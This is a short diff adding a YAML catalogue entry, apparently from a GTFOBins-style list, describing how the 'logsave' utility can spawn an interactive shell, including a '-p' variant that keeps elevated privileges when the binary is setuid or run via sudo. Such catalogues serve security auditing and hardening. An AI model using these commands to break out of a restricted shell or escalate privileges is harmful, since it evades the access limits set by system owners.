@@ -1,0 +1,13 @@
+---
+functions:
+  shell:
+  - code: |-
+      logsave /dev/null /bin/sh -i
+    contexts:
+      sudo:
+      suid:
+        code: |-
+          logsave /dev/null /bin/sh -i -p
+        shell: false
+      unprivileged:
+...
